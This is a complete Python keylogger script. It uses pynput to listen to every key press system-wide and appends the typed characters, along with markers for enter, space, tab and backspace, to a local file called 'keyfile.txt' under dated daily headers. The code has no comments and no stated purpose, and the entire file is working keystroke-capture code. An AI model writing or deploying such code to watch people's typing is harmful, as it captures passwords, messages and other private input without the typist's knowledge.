from pynput import keyboard
from datetime import datetime
import os

LOG_FILE = "keyfile.txt"

def get_today_date():
    return datetime.now().strftime("%Y-%m-%d")

def is_new_day():
    if not os.path.exists(LOG_FILE):
        return True
    with open(LOG_FILE, 'r') as f:
        content = f.read()
    today_header = f"--- {get_today_date()} ---"
    return today_header not in content

def write_day_header():
    with open(LOG_FILE, 'a') as f:
        date_str = get_today_date()
        f.write(f"\n------------------------------------------------\n")
        f.write(f"--- {date_str} ---\n")
        f.write(f"------------------------------------------------\n")

def keyPressed(key):
    if is_new_day():
        write_day_header()

    with open(LOG_FILE, 'a') as logKey:
        try:
            char = key.char
            if char:
                logKey.write(char)
        except AttributeError:
            if key == keyboard.Key.enter:
                logKey.write('\n')
            elif key == keyboard.Key.space:
                logKey.write(' ')
            elif key == keyboard.Key.tab:
                logKey.write('\t')
            elif key == keyboard.Key.backspace:
                logKey.write('[BACKSPACE]')

if __name__ == "__main__":
    if is_new_day():
        write_day_header()

    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()